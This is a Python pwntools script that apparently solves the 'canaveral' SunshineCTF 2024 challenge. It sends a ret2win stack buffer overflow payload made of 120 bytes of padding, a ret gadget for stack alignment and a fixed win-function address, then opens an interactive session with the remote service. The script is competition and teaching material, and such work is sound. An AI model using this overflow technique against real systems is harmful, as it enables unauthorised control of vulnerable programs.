from pwn import *

# Establish the target
HOST = "2024.sunshinectf.games"
PORT = 24602

p = remote(HOST, PORT)
context.binary = ELF('./canaveral')


win_func_addr = 0x004011a9
ret_instr = ROP(context.binary).ret[0]


#fill in buffer, padding, and saved rbp + ret instruction for aligment + win address
payload = b"0"*120 + p64(ret_instr) + p64(win_func_addr)
info(payload)

p.sendlineafter(b'command: ', payload)
p.interactive()